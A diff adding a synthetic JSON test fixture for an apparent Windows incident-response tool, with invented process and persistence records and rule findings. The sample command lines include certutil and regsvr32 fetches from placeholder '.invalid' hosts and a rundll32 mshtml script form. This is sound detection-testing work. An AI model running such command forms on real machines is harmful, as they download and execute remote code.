@@ -1,0 +1,1353 @@
+{
+  "snapshot": {
+    "schema_version": "1.0",
+    "snapshot_id": "00000000-0000-0000-0000-0000000000c9",
+    "tool_version": "0.3.0",
+    "started_at": "2026-09-17T14:05:00Z",
+    "finished_at": "2026-09-17T14:05:10Z",
+    "system": null,
+    "processes": [
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000578",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 400,
+        "ppid": 100,
+        "name": "explorer.exe",
+        "executable": "C:\\Windows\\explorer.exe",
+        "command_line": [
+          "C:\\Windows\\explorer.exe"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:00Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000582",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 410,
+        "ppid": 400,
+        "name": "WINWORD.EXE",
+        "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "command_line": [
+          "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:01Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-00000000058c",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 420,
+        "ppid": 410,
+        "name": "powershell.exe",
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": null,
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:02Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-00000000058d",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 421,
+        "ppid": 410,
+        "name": "cmd.exe",
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "command_line": [
+          "C:\\Windows\\System32\\cmd.exe",
+          "/c",
+          "echo",
+          "Synthetic fixture only"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:03Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-00000000058e",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 422,
+        "ppid": 410,
+        "name": "wscript.exe",
+        "executable": "C:\\Windows\\System32\\wscript.exe",
+        "command_line": [
+          "C:\\Windows\\System32\\wscript.exe",
+          "C:\\IRSnapshotFixtures\\example.vbs"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:04Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000596",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 430,
+        "ppid": 400,
+        "name": "example-installer.exe",
+        "executable": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe",
+        "command_line": [
+          "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe",
+          "--synthetic"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:05Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000597",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 431,
+        "ppid": 400,
+        "name": "example-agent.exe",
+        "executable": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe",
+        "command_line": [
+          "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe",
+          "--synthetic"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:06Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 440,
+        "ppid": 400,
+        "name": "certutil.exe",
+        "executable": "C:\\Windows\\System32\\certutil.exe",
+        "command_line": [
+          "C:\\Windows\\System32\\certutil.exe",
+          "-urlcache",
+          "-split",
+          "-f",
+          "https://downloads.example.invalid/sample.txt",
+          "C:\\IRSnapshotFixtures\\sample.txt"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:07Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-0000000005a1",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 441,
+        "ppid": 400,
+        "name": "rundll32.exe",
+        "executable": "C:\\Windows\\System32\\rundll32.exe",
+        "command_line": [
+          "C:\\Windows\\System32\\rundll32.exe",
+          "javascript:\"..\\mshtml,RunHTMLApplication\";/* inert synthetic marker */"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:08Z"
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "processes",
+        "pid": 442,
+        "ppid": 400,
+        "name": "regsvr32.exe",
+        "executable": "C:\\Windows\\System32\\regsvr32.exe",
+        "command_line": [
+          "C:\\Windows\\System32\\regsvr32.exe",
+          "/s",
+          "/n",
+          "/u",
+          "/i:https://scripts.example.invalid/example.sct",
+          "scrobj.dll"
+        ],
+        "username": "EXAMPLE-LAB\\ExampleUser",
+        "created_at": "2026-09-17T14:00:09Z"
+      }
+    ],
+    "network": [],
+    "users": [
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000004",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "users",
+        "name": "ExampleUser",
+        "domain": "EXAMPLE-LAB",
+        "sid": "S-1-5-21-100-200-300-1001",
+        "source": "current_token",
+        "enabled": true,
+        "session_name": null,
+        "logged_in_at": null,
+        "member_of_sid": null
+      }
+    ],
+    "services": [
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000005",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "services",
+        "name": "ExampleService",
+        "display_name": "Synthetic example service",
+        "status": "stopped",
+        "command": "\"C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\" --synthetic",
+        "startup_type": "automatic",
+        "username": "LocalSystem",
+        "pid": null
+      }
+    ],
+    "scheduled_tasks": [
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000006",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "scheduled_tasks",
+        "name": "ExampleTask",
+        "task_path": "\\Examples\\",
+        "state": "Disabled",
+        "enabled": false,
+        "principal": "ExampleUser",
+        "actions": [
+          {
+            "kind": "exec",
+            "executable": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+            "arguments": "--synthetic",
+            "working_directory": null,
+            "class_id": null
+          },
+          {
+            "kind": "exec",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "arguments": "-NoProfile -File \"C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\"",
+            "working_directory": null,
+            "class_id": null
+          }
+        ],
+        "triggers": [
+          {
+            "kind": "time",
+            "enabled": false,
+            "start_boundary_raw": "2026-09-18T12:00:00",
+            "end_boundary_raw": null,
+            "start_at": null,
+            "end_at": null,
+            "user_id": null,
+            "repetition_interval": null
+          }
+        ]
+      }
+    ],
+    "persistence": [
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000007",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "persistence",
+        "kind": "service",
+        "location": "Services/ExampleService",
+        "entry_name": "ExampleService",
+        "command": "\"C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\" --synthetic",
+        "target_path": null,
+        "owner_sid": null,
+        "registry_view": null,
+        "registry_value_type": null,
+        "enabled": true,
+        "source_artifact_id": "00000000-0000-0000-0000-000000000005",
+        "action_index": null
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000008",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "persistence",
+        "kind": "run_key",
+        "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "entry_name": "ExampleStartup",
+        "command": "\"%APPDATA%\\ExampleVendor\\startup.exe\" --synthetic",
+        "target_path": null,
+        "owner_sid": "S-1-5-21-100-200-300-1001",
+        "registry_view": "64",
+        "registry_value_type": "REG_EXPAND_SZ",
+        "enabled": true,
+        "source_artifact_id": null,
+        "action_index": null
+      },
+      {
+        "artifact_id": "00000000-0000-0000-0000-000000000009",
+        "observed_at": "2026-09-17T14:05:00Z",
+        "collector": "persistence",
+        "kind": "scheduled_task",
+        "location": "\\Examples\\ExampleTask",
+        "entry_name": "ExampleTask",
+        "command": null,
+        "target_path": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+        "owner_sid": null,
+        "registry_view": null,
+        "registry_value_type": null,
+        "enabled": false,
+        "source_artifact_id": "00000000-0000-0000-0000-000000000006",
+        "action_index": 0
+      }
+    ],
+    "path_context": {
+      "known_paths": [
+        {
+          "kind": "windows",
+          "path": "C:\\Windows",
+          "owner_sid": null,
+          "source": "synthetic fixture"
+        },
+        {
+          "kind": "profile",
+          "path": "C:\\Users\\ExampleUser",
+          "owner_sid": "S-1-5-21-100-200-300-1001",
+          "source": "synthetic fixture"
+        },
+        {
+          "kind": "appdata",
+          "path": "C:\\Users\\ExampleUser\\AppData\\Roaming",
+          "owner_sid": "S-1-5-21-100-200-300-1001",
+          "source": "synthetic fixture"
+        },
+        {
+          "kind": "local_appdata",
+          "path": "C:\\Users\\ExampleUser\\AppData\\Local",
+          "owner_sid": "S-1-5-21-100-200-300-1001",
+          "source": "synthetic fixture"
+        },
+        {
+          "kind": "temp",
+          "path": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp",
+          "owner_sid": "S-1-5-21-100-200-300-1001",
+          "source": "synthetic fixture"
+        }
+      ],
+      "environment": [
+        {
+          "name": "SystemRoot",
+          "value": "C:\\Windows",
+          "owner_sid": null
+        },
+        {
+          "name": "APPDATA",
+          "value": "C:\\Users\\ExampleUser\\AppData\\Roaming",
+          "owner_sid": "S-1-5-21-100-200-300-1001"
+        },
+        {
+          "name": "LOCALAPPDATA",
+          "value": "C:\\Users\\ExampleUser\\AppData\\Local",
+          "owner_sid": "S-1-5-21-100-200-300-1001"
+        },
+        {
+          "name": "TEMP",
+          "value": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp",
+          "owner_sid": "S-1-5-21-100-200-300-1001"
+        }
+      ]
+    },
+    "collector_runs": [
+      {
+        "collector": "system",
+        "status": "failed",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 0,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": [
+          {
+            "collector": "system",
+            "category": "unavailable",
+            "message": "Synthetic collection failure for demonstration.",
+            "observed_at": "2026-09-17T14:05:00Z",
+            "artifact_id": null,
+            "target": null,
+            "field": null,
+            "exception_type": null
+          }
+        ]
+      },
+      {
+        "collector": "processes",
+        "status": "partial",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 10,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": [
+          {
+            "collector": "processes",
+            "category": "access_denied",
+            "message": "Synthetic denied command-line field; other process fields retained.",
+            "observed_at": "2026-09-17T14:05:00Z",
+            "artifact_id": "00000000-0000-0000-0000-00000000058c",
+            "target": null,
+            "field": "command_line",
+            "exception_type": null
+          }
+        ]
+      },
+      {
+        "collector": "network",
+        "status": "failed",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 0,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": [
+          {
+            "collector": "network",
+            "category": "unavailable",
+            "message": "Synthetic collection failure for demonstration.",
+            "observed_at": "2026-09-17T14:05:00Z",
+            "artifact_id": null,
+            "target": null,
+            "field": null,
+            "exception_type": null
+          }
+        ]
+      },
+      {
+        "collector": "users",
+        "status": "ok",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 1,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": []
+      },
+      {
+        "collector": "services",
+        "status": "ok",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 1,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": []
+      },
+      {
+        "collector": "scheduled_tasks",
+        "status": "ok",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 1,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": []
+      },
+      {
+        "collector": "persistence",
+        "status": "ok",
+        "started_at": "2026-09-17T14:05:00Z",
+        "finished_at": "2026-09-17T14:05:10Z",
+        "item_count": 3,
+        "scope": [
+          "Invented review fixture only; not a live collection or a complete Windows inventory."
+        ],
+        "issues": []
+      }
+    ]
+  },
+  "analysis": {
+    "schema_version": "1.0",
+    "snapshot_id": "00000000-0000-0000-0000-0000000000c9",
+    "ruleset_version": "1.0.0",
+    "complete": true,
+    "findings": [
+      {
+        "finding_id": "4e656e63-016d-54d9-8eab-8cf38283c92a",
+        "rule_id": "IRS-P003",
+        "title": "Office spawned PowerShell",
+        "severity": "high",
+        "description": "A recognized Office basename directly parented a PowerShell host with a temporally consistent link. Legitimate Office automation can do this; basename evidence does not verify the publisher or establish exploitation.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058c"
+        ],
+        "pids": [
+          410,
+          420
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.created_at",
+            "value": "2026-09-17T14:00:01+00:00",
+            "explanation": "Captured parent creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.executable",
+            "value": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "explanation": "Captured parent identity used for case-insensitive basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058c",
+            "field": "child.created_at",
+            "value": "2026-09-17T14:00:02+00:00",
+            "explanation": "Captured child creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058c",
+            "field": "child.executable",
+            "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "explanation": "Captured direct-child identity used for basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058c",
+            "field": "relationship",
+            "value": "direct child of PID 410",
+            "explanation": "The deterministic tree linked both collected records directly."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "88ddbb83-0acb-5b9c-9010-e917391a380c",
+        "rule_id": "IRS-P005",
+        "title": "Office spawned script host",
+        "severity": "high",
+        "description": "A recognized Office basename directly parented a Windows script host with a temporally consistent link. Legitimate scripted workflows exist; basename evidence does not verify the publisher or characterize script contents.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058e"
+        ],
+        "pids": [
+          410,
+          422
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.created_at",
+            "value": "2026-09-17T14:00:01+00:00",
+            "explanation": "Captured parent creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.executable",
+            "value": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "explanation": "Captured parent identity used for case-insensitive basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058e",
+            "field": "child.created_at",
+            "value": "2026-09-17T14:00:04+00:00",
+            "explanation": "Captured child creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058e",
+            "field": "child.executable",
+            "value": "C:\\Windows\\System32\\wscript.exe",
+            "explanation": "Captured direct-child identity used for basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058e",
+            "field": "relationship",
+            "value": "direct child of PID 410",
+            "explanation": "The deterministic tree linked both collected records directly."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "3a4512c4-5fe0-5eb3-bd68-64a17fab0bba",
+        "rule_id": "IRS-P009",
+        "title": "Rundll32 JavaScript/mshtml form",
+        "severity": "high",
+        "description": "Rundll32 used an explicit JavaScript/mshtml RunHTMLApplication form. This rule does not match a normal DLL/export invocation and does not interpret or execute the later script data.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a1"
+        ],
+        "pids": [
+          441
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a1",
+            "field": "command_line",
+            "value": [
+              "C:\\Windows\\System32\\rundll32.exe",
+              "javascript:\"..\\mshtml,RunHTMLApplication\";/* inert synthetic marker */"
+            ],
+            "explanation": "Captured argv tokens preserved as evidence; no token was executed."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a1",
+            "field": "executable",
+            "value": "C:\\Windows\\System32\\rundll32.exe",
+            "explanation": "Captured executable path; it is not a publisher or signature assertion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a1",
+            "field": "script_pattern",
+            "value": "javascript:\"..\\mshtml,RunHTMLApplication\";/* inert synthetic marker */",
+            "explanation": "The explicit script-oriented pattern occupies argv index 1."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "87bd0b77-ac59-539a-a23f-7319bc845375",
+        "rule_id": "IRS-P010",
+        "title": "Regsvr32 remote scriptlet form",
+        "severity": "high",
+        "description": "Regsvr32 combined a remote /i: argument with scrobj.dll. Normal local component registration does not satisfy this form; the evidence still does not prove execution.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a2"
+        ],
+        "pids": [
+          442
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+            "field": "scriptlet_target",
+            "value": "scrobj.dll",
+            "explanation": "A separate target token has the exact Windows basename scrobj.dll."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+            "field": "command_line",
+            "value": [
+              "C:\\Windows\\System32\\regsvr32.exe",
+              "/s",
+              "/n",
+              "/u",
+              "/i:https://scripts.example.invalid/example.sct",
+              "scrobj.dll"
+            ],
+            "explanation": "Captured argv tokens preserved as evidence; no token was executed."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+            "field": "executable",
+            "value": "C:\\Windows\\System32\\regsvr32.exe",
+            "explanation": "Captured executable path; it is not a publisher or signature assertion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+            "field": "remote_install_argument",
+            "value": "/i:https://scripts.example.invalid/example.sct",
+            "explanation": "Inline /i: argument contains a standalone HTTP(S) value."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "82825a4d-5611-5247-b235-e3fcfce02a85",
+        "rule_id": "IRS-R003",
+        "title": "Service executable in a user-writable directory",
+        "severity": "high",
+        "description": "A service command's explicit executable is in a conventional user-writable location identified from captured roots. This lexical heuristic does not establish an exploitable ACL or malicious service; development tools and per-user service software are plausible benign explanations.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000005"
+        ],
+        "pids": [],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "username",
+            "value": "LocalSystem",
+            "explanation": "Captured service account name; no SID or privilege is inferred."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "name",
+            "value": "ExampleService",
+            "explanation": "Captured service name."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "startup_type",
+            "value": "automatic",
+            "explanation": "Captured service startup type."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "status",
+            "value": "stopped",
+            "explanation": "Captured service status; it is not installation-time evidence."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "path_basis",
+            "value": "The normalized path is within a captured local_appdata root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "command",
+            "value": "\"C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\" --synthetic",
+            "explanation": "Original service command; it was not executed or rewritten."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "interpreted_target",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe",
+            "explanation": "The explicit executable or supported script target retained from evidence."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000005",
+            "field": "target_provenance",
+            "value": "raw_command_executable",
+            "explanation": "The parser records how the target was obtained without executing it."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "9b3adc97-9c46-55d7-82d8-bf20872ce78a",
+        "rule_id": "IRS-P004",
+        "title": "Office spawned command shell",
+        "severity": "medium",
+        "description": "A recognized Office basename directly parented cmd.exe with a temporally consistent link. Legitimate Office automation can launch a shell; basename evidence does not verify the publisher or establish exploitation.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058d"
+        ],
+        "pids": [
+          410,
+          421
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.created_at",
+            "value": "2026-09-17T14:00:01+00:00",
+            "explanation": "Captured parent creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000582",
+            "field": "parent.executable",
+            "value": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "explanation": "Captured parent identity used for case-insensitive basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058d",
+            "field": "child.created_at",
+            "value": "2026-09-17T14:00:03+00:00",
+            "explanation": "Captured child creation time required for a temporally consistent tree link."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058d",
+            "field": "child.executable",
+            "value": "C:\\Windows\\System32\\cmd.exe",
+            "explanation": "Captured direct-child identity used for basename matching."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-00000000058d",
+            "field": "relationship",
+            "value": "direct child of PID 410",
+            "explanation": "The deterministic tree linked both collected records directly."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "3f9c0ab6-6e28-5afd-854a-6e6746f658c4",
+        "rule_id": "IRS-P006",
+        "title": "Process executable in TEMP",
+        "severity": "medium",
+        "description": "The captured executable path is in an identified TEMP directory. Installers and updaters commonly execute there, so the location warrants review but is not a trust conclusion.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000596"
+        ],
+        "pids": [
+          430
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000596",
+            "field": "executable",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe",
+            "explanation": "Captured executable path required by this location rule."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000596",
+            "field": "path_basis",
+            "value": "The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Classifier basis; this makes no ACL, trust, or existence claim."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000596",
+            "field": "normalized_path",
+            "value": "c:\\users\\exampleuser\\appdata\\local\\temp\\example-installer.exe",
+            "explanation": "Lexically normalized Windows path derived only from captured context."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "268e5ec8-2180-5764-a0dd-9ba61d980e48",
+        "rule_id": "IRS-P008",
+        "title": "Certutil remote forced retrieval",
+        "severity": "medium",
+        "description": "Certutil combined -urlcache and forced retrieval with a standalone HTTP(S) source. Legitimate certificate administration can fetch remote material, so review the source and workflow.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a0"
+        ],
+        "pids": [
+          440
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+            "field": "command_line",
+            "value": [
+              "C:\\Windows\\System32\\certutil.exe",
+              "-urlcache",
+              "-split",
+              "-f",
+              "https://downloads.example.invalid/sample.txt",
+              "C:\\IRSnapshotFixtures\\sample.txt"
+            ],
+            "explanation": "Captured argv tokens preserved as evidence; no token was executed."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+            "field": "executable",
+            "value": "C:\\Windows\\System32\\certutil.exe",
+            "explanation": "Captured executable path; it is not a publisher or signature assertion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+            "field": "download_options",
+            "value": [
+              "-urlcache",
+              "-split",
+              "-f"
+            ],
+            "explanation": "Exact supported certutil option tokens found in captured argv."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+            "field": "remote_source",
+            "value": "https://downloads.example.invalid/sample.txt",
+            "explanation": "Standalone HTTP(S) URLCache positional source after supported no-value flags."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "3412a101-2845-5107-9935-047196c427e6",
+        "rule_id": "IRS-R001",
+        "title": "Run-key target in a user-writable directory",
+        "severity": "medium",
+        "description": "A Run-key command has an explicit executable or supported script target in a conventional user-writable location identified from captured roots. This is a lexical heuristic; legitimate logon software can use the same locations.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000008"
+        ],
+        "pids": [],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "entry_name",
+            "value": "ExampleStartup",
+            "explanation": "Captured Run-key value name."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "owner_sid",
+            "value": "S-1-5-21-100-200-300-1001",
+            "explanation": "Captured owner SID used only for owner-scoped environment expansion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "location",
+            "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "explanation": "Captured registry location and owner scope."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "path_basis",
+            "value": "The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "command",
+            "value": "\"%APPDATA%\\ExampleVendor\\startup.exe\" --synthetic",
+            "explanation": "Original Run-key command; it was not executed or rewritten."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "interpreted_target",
+            "value": "%APPDATA%\\ExampleVendor\\startup.exe",
+            "explanation": "The explicit executable or supported script target retained from evidence."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000008",
+            "field": "target_provenance",
+            "value": "raw_command_executable",
+            "explanation": "The parser records how the target was obtained without executing it."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "a58a7be7-0f54-5b6e-bafa-a1ee8782f40e",
+        "rule_id": "IRS-R002",
+        "title": "Scheduled-task target in AppData or TEMP",
+        "severity": "medium",
+        "description": "One or more scheduled-task actions have an explicit executable or supported script target in conventional AppData or TEMP locations identified from captured roots. This is a lexical heuristic; legitimate per-user automation can use these locations.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000006"
+        ],
+        "pids": [],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "enabled",
+            "value": false,
+            "explanation": "Captured enabled state; disabled tasks remain inventory and findings."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "task_path",
+            "value": "\\Examples\\",
+            "explanation": "Captured full task namespace path."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "name",
+            "value": "ExampleTask",
+            "explanation": "Captured task name."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "principal",
+            "value": "ExampleUser",
+            "explanation": "Captured task principal; no SID is inferred from this name."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "state",
+            "value": "Disabled",
+            "explanation": "Captured task state; it is not evidence that the task ran."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[0].path_basis",
+            "value": "The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].path_basis",
+            "value": "The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
